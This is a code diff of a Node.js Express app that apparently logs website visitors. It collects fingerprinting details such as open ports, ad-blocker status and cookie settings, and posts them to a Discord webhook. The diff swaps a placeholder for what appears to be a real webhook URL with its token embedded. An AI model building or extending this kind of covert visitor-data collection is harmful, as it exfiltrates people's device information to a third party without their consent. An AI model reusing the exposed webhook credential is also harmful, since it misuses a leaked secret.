@@ -5,7 +5,7 @@ const path = require('path'); // Import the 'path' module
 const app = express();
 app.use(express.json());
 const port = 3000;
-var webhook_url = "ADD YA TOKEN HERE MATEY"
+var webhook_url = "https://discord.com/api/webhooks/1136009407608660048/JMvzKHlFPuLjN5H7pmNOuSpPL4pmWEiHqTh1xFc6YVAZyoEis8JvyGPYbA-0C6Wf6ctP"
 
 // Set the view engine to EJS
 app.set('view engine', 'ejs');
@@ -124,9 +124,21 @@ app.post('/', (req, res) => {
                         "name": "Open Ports",
                         "value": openPorts.join(', ') || "None",
                         "inline": true
+                    },
+                    {
+                        "name": "Ad Blocker Detected",
+                        "value": additionalDetails.adBlockerEnabled,
+                        "inline": true
+                    },
+                    {
+                        "name": "Cookies Enabled",
+                        "value": additionalDetails.cookiesEnabled,
+                        "inline": true
                     }
+                    
                 ]
             }];
+            console.log(embeds[0].fields)
             sendDiscordMessage(embeds);
         })
         .catch((error) => {
